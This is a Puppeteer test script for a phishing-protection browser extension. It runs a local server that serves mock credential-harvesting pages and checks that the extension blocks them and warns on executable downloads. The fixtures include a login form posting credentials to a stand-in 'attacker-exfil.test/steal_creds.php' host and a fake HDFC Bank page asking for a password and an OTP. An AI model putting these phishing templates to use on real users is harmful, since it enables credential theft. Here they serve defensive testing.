import puppeteer from 'puppeteer-core';
import http from 'http';
import path from 'path';
import fs from 'fs';
import os from 'os';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const extPath = path.resolve(__dirname, '..');

const candidateBrowsers = [
  'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe',
  'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
  'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'
].filter(p => fs.existsSync(p));

const PORT = 8085;

// Local fixture HTTP server
function startFixtureServer() {
  const server = http.createServer((req, res) => {
    // 1. Fixture: Cross-domain credential exfiltration on allowlisted domain
    if (req.url === '/fixture/exfil') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(`<!DOCTYPE html>
<html>
<head><title>Allowlisted Corp - Employee Login</title></head>
<body>
  <h2>Allowlisted Corporate Portal</h2>
  <form action="http://attacker-exfil.test:${PORT}/steal_creds.php" method="POST">
    <input type="text" name="user" placeholder="Corporate ID" />
    <input type="password" name="pass" placeholder="Password" />
    <button type="submit">Sign In</button>
  </form>
</body>
</html>`);
    }

    // 2. Fixture: User-content subdomain (multi-tenant tenant on pages.dev)
    if (req.url === '/fixture/user-subdomain') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(`<!DOCTYPE html>
<html>
<head><title>HDFC Bank NetBanking Verification</title></head>
<body>
  <h2>HDFC Bank Secure NetBanking Login</h2>
  <form action="http://malicious-tenant.pages.dev:${PORT}/login" method="POST">
    <input type="text" placeholder="Customer ID" />
    <input type="password" placeholder="NetBanking Password" />
    <input type="text" placeholder="OTP" />
    <button type="submit">Submit Verification</button>
  </form>
</body>
</html>`);
    }

    // 3. Download endpoints: Executable (.exe), Installer (.apk), Script (.bat)
    if (req.url === '/fixture/download/agent.exe') {
      res.writeHead(200, {
        'Content-Type': 'application/x-msdownload',
        'Content-Disposition': 'attachment; filename="corporate_agent.exe"',
        'Content-Length': 16
      });
      return res.end('MZ_FIXTURE_BINARY');
    }

    if (req.url === '/fixture/download/security.apk') {
      res.writeHead(200, {
        'Content-Type': 'application/vnd.android.package-archive',
        'Content-Disposition': 'attachment; filename="security_update.apk"',
        'Content-Length': 16
      });
      return res.end('PK_FIXTURE_APK___');
    }

    if (req.url === '/fixture/download/setup.bat') {
      res.writeHead(200, {
        'Content-Type': 'text/plain',
        'Content-Disposition': 'attachment; filename="setup_script.bat"',
        'Content-Length': 16
      });
      return res.end('@echo off\r\nexit\r\n');
    }

    if (req.url === '/fixture/download-portal') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(`<!DOCTYPE html>
<html>
<head><title>Allowlisted Corp - Software Downloads</title></head>
<body>
  <h2>Internal Downloads Portal</h2>
  <a id="dl-exe" href="/fixture/download/agent.exe">Download Agent EXE</a>
  <a id="dl-apk" href="/fixture/download/security.apk">Download Mobile APK</a>
  <a id="dl-bat" href="/fixture/download/setup.bat">Download Setup BAT</a>
</body>
</html>`);
    }

    res.writeHead(404);
    res.end('Not Found');
  });

  return new Promise((resolve) => {
    server.listen(PORT, () => resolve(server));
  });
}

async function runFixtureTests() {
  console.log('======================================================================');
  console.log('🛡️ REAL BROWSER FIXTURE: ALLOWLIST ABUSE & GENERAL MECHANISM AUDIT');
  console.log('======================================================================\n');

  if (candidateBrowsers.length === 0) {
    console.error('No Chromium browser found!');
    process.exit(1);
  }

  // 1. Stage extension and modify build configuration (config/legit_domains.json)
  const tempExtDir = path.join(os.tmpdir(), 'verity_ext_fixture_clean');
  if (fs.existsSync(tempExtDir)) fs.rmSync(tempExtDir, { recursive: true, force: true });
  fs.cpSync(extPath, tempExtDir, {
    recursive: true,
    filter: (src) => !src.includes('node_modules') && !src.includes('.git')
  });

  // Add fixture host and private platform to build configuration in staged directory
  const stagedLegitPath = path.join(tempExtDir, 'config', 'legit_domains.json');
  const stagedLegit = JSON.parse(fs.readFileSync(stagedLegitPath, 'utf8'));
  stagedLegit.unshift({
    domain: 'allowlisted-corp.test',
    source: 'build_configuration_fixture_test'
  });
  stagedLegit.unshift({
    domain: 'github.io',
    source: 'build_configuration_fixture_test'
  });
  fs.writeFileSync(stagedLegitPath, JSON.stringify(stagedLegit, null, 2), 'utf8');
  console.log(`[Fixture] Staged extension in: ${tempExtDir}`);
  console.log(`[Fixture] Injected "allowlisted-corp.test" and "github.io" into staged config/legit_domains.json`);

  // Start fixture HTTP server
  const server = await startFixtureServer();
  console.log(`[Fixture] Local HTTP server listening on port ${PORT}`);

  // Launch browser with host resolver rules
  const browser = await puppeteer.launch({
    executablePath: candidateBrowsers[0],
    headless: 'new',
    args: [
      `--disable-extensions-except=${tempExtDir}`,
      `--load-extension=${tempExtDir}`,
      '--no-sandbox',
      '--disable-setuid-sandbox',
      `--host-resolver-rules=MAP *.test 127.0.0.1, MAP *.github.io 127.0.0.1`
    ]
  });

  await new Promise(r => setTimeout(r, 2000));
  const swTarget = await browser.waitForTarget(t => t.type() === 'service_worker', { timeout: 10000 });
  const sw = await swTarget.worker();
  console.log('[Fixture] Service worker initialized.');

  const results = {};

  // ── TEST 1: Cross-domain credential form on allowlisted registered domain ──
  console.log('\n--- Test 1: Cross-Domain Credential Exfiltration on Allowlisted Host ---');
  const exfilUrl = `http://allowlisted-corp.test:${PORT}/fixture/exfil`;
  const exfilPage = await browser.newPage();
  await exfilPage.goto(exfilUrl, { waitUntil: 'domcontentloaded' });
  
  // Wait up to 5s for block overlay
  await exfilPage.waitForSelector('#verity-security-host', { timeout: 8000 });
  const exfilOverlay = await exfilPage.evaluate(() => {
    const host = document.getElementById('verity-security-host');
    return {
      action: host.getAttribute('data-action'),
      score: parseInt(host.getAttribute('data-score') || '0', 10),
      title: host.getAttribute('data-state-title')
    };
  });
  console.log(`  Page URL: ${exfilUrl}`);
  console.log(`  Overlay Action: ${exfilOverlay.action} | Score: ${exfilOverlay.score}/100`);
  console.log(`  Overlay Title:  "${exfilOverlay.title}"`);
  results.test1_exfil = {
    url: exfilUrl,
    action: exfilOverlay.action,
    score: exfilOverlay.score,
    passed: exfilOverlay.action === 'block' && exfilOverlay.score >= 70
  };
  await exfilPage.close();

  // ── TEST 2: User-content-style subdomain never inherits allowlist cap ───────
  console.log('\n--- Test 2: User-Content-Style Subdomain (malicious-tenant.github.io) ---');
  const userSubdomainUrl = `http://malicious-tenant.github.io:${PORT}/fixture/user-subdomain`;
  const tenantPage = await browser.newPage();
  await tenantPage.goto(userSubdomainUrl, { waitUntil: 'domcontentloaded' });

  // Wait up to 5s for block overlay
  await tenantPage.waitForSelector('#verity-security-host', { timeout: 8000 });
  const tenantOverlay = await tenantPage.evaluate(() => {
    const host = document.getElementById('verity-security-host');
    return {
      action: host.getAttribute('data-action'),
      score: parseInt(host.getAttribute('data-score') || '0', 10),
      title: host.getAttribute('data-state-title')
    };
  });
  console.log(`  Page URL: ${userSubdomainUrl}`);
  console.log(`  Overlay Action: ${tenantOverlay.action} | Score: ${tenantOverlay.score}/100`);
  console.log(`  Overlay Title:  "${tenantOverlay.title}"`);
  results.test2_userSubdomain = {
    url: userSubdomainUrl,
    action: tenantOverlay.action,
    score: tenantOverlay.score,
    passed: tenantOverlay.action === 'block' && tenantOverlay.score >= 70
  };
  await tenantPage.close();

  // ── TEST 3: ALL download warning types shown (not only Chrome-dangerous) ───
  console.log('\n--- Test 3: All Download Warning Types Shown on Allowlisted Domain ---');
  const dlPortalUrl = `http://allowlisted-corp.test:${PORT}/fixture/download-portal`;
  const dlPage = await browser.newPage();
  await dlPage.goto(dlPortalUrl, { waitUntil: 'domcontentloaded' });

  // Helper to trigger download and check warning modal
  async function testDownloadType(filename, expectedExtension, label) {
    console.log(`  Testing download type [${label}]: ${filename}...`);
    await sw.evaluate(async (url, fn) => {
      if (chrome.downloads && chrome.downloads.download) {
        await chrome.downloads.download({ url, filename: fn });
      }
    }, `http://allowlisted-corp.test:${PORT}/fixture/download/${filename}`, filename);

    // Wait for download warning modal in DOM
    await dlPage.waitForSelector('#verity-download-warning-host', { timeout: 8000 });
    const modalFound = await dlPage.evaluate(() => {
      const host = document.getElementById('verity-download-warning-host');
      if (!host) return false;
      // Remove modal for next download test
      host.remove();
      return true;
    });
    console.log(`    -> Modal injected in page DOM: ${modalFound}`);
    return modalFound;
  }

  const exeWarning = await testDownloadType('agent.exe', '.exe', 'Executable');
  await new Promise(r => setTimeout(r, 1000));
  const apkWarning = await testDownloadType('security.apk', '.apk', 'Installer/Mobile Package');
  await new Promise(r => setTimeout(r, 1000));
  const batWarning = await testDownloadType('setup.bat', '.bat', 'Script File');

  results.test3_downloadWarnings = {
    executableExe: exeWarning,
    installerApk: apkWarning,
    scriptBat: batWarning,
    allShown: exeWarning && apkWarning && batWarning
  };
  console.log(`  ALL download warning types shown on allowlisted domain: ${results.test3_downloadWarnings.allShown}`);
  await dlPage.close();

  await browser.close();
  server.close();

  // Save results
  fs.writeFileSync(
    path.resolve(__dirname, '../benchmark/allowlist_fixture_results.json'),
    JSON.stringify({ timestamp: new Date().toISOString(), results }, null, 2),
    'utf8'
  );

  console.log('\n======================================================================');
  console.log('RESULTS SUMMARY:');
  console.log(`  Test 1 (Cross-Domain Exfil on Allowlisted Host Blocks):   ${results.test1_exfil.passed ? 'PASSED ✅' : 'FAILED ❌'}`);
  console.log(`  Test 2 (User-Content Subdomain Never Inherits Cap):       ${results.test2_userSubdomain.passed ? 'PASSED ✅' : 'FAILED ❌'}`);
  console.log(`  Test 3 (ALL Download Types Show Warning on Allowlisted):  ${results.test3_downloadWarnings.allShown ? 'PASSED ✅' : 'FAILED ❌'}`);
  console.log('======================================================================');
  console.log('Wrote benchmark/allowlist_fixture_results.json');
}

runFixtureTests().catch((err) => {
  console.error('[Fixture Error]', err);
  process.exit(1);
});
